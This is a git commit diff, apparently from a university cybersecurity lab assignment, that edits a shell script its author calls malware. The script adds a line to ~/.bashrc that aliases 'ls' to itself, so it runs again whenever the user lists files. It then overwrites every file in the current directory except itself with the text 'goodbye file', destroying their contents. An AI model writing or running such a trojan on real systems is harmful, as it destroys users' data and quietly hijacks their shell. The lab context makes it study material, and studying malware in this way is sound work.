e3607ca6be6ddf96d7c401f20c0744f39ec1a97a
Annelise Trout <trouta@mail.gvsu.edu>
2020-10-24 15:37:51 -0400

    malware overwrite script overwriting ls alias

--- script.sh
+++ script.sh
@@ -7,21 +7,38 @@
 # to execute our malware script, then add this alias to further propagate.
 # aliasToMatch = alias to set if nonexistent
 # currentLastAlias = last alias/line currently in ~/.bashrc
-aliasToMatch="alias pwd='/home/cybersecurity/Desktop/cis458labs/lab07/CIS458-Lab7/script.sh'"
-currentLastAlias=$(cat ~/.bashrc | tail -n 1)
-if [ "$currentLastAlias" != "$aliasToMatch" ]; then
-	echo "alias pwd='/home/cybersecurity/Desktop/cis458labs/lab07/CIS458-Lab7/script.sh'" >> ~/.bashrc
+
+# Get current path to script
+
+# WARNING: THIS WILL ONLY WORK IF WE START IN THE SCRIPT DIR. WE NEED TO KNOW WHERE TO PLACE THIS FILE!
+#currentDir=$(pwd)
+#scriptName="script.sh"
+#loc=$currentDir/$scriptName
+
+# update aliasToMatch to the path to this script
+aliasToMatch="alias ls='/home/cybersecurity/Desktop/cis458labs/lab07/CIS458-Lab7/script.sh'"
+currentLastLine=$(cat ~/.bashrc | tail -n 1)
+if [ "$currentLastLine" != "$aliasToMatch" ]; then
+
+#	echo "alias to match: $aliasToMatch"
+	echo "$aliasToMatch" >> ~/.bashrc
 	source ~/.bashrc
 fi
 
+# List files before altering
+ls
+
 # Load files into an array
-filearray=($(ls | grep -Ev "script[[:digit:]]*.sh"))
+filearray=($(ls | grep -Ev "script[[:digit:]]*\.sh"))
 
 # Loop through file array and overwrite files
 for key in ${!filearray[@]}
 do
+	# TEST
+	#echo "Attempting evil"
+
 	echo "goodbye file" > ${filearray[$key]}
 done
 
-# Trojan horse - whatever output is here should match bashrc alias expected output
-pwd
+
+
